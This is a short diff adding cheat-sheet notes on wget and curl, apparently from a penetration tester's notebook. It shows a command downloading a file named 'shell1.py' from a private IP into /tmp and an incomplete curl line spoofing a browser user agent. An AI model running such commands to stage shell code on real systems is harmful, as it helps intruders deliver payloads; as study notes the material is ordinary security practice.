@@ -1,0 +1,9 @@
+WGET
+Download a file and output to different directory - always use http:// or https://
+
+wget http://192.168.1.107/shell1.py -O /tmp/shell1.py
+
+change user agent
+
+curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" 
+
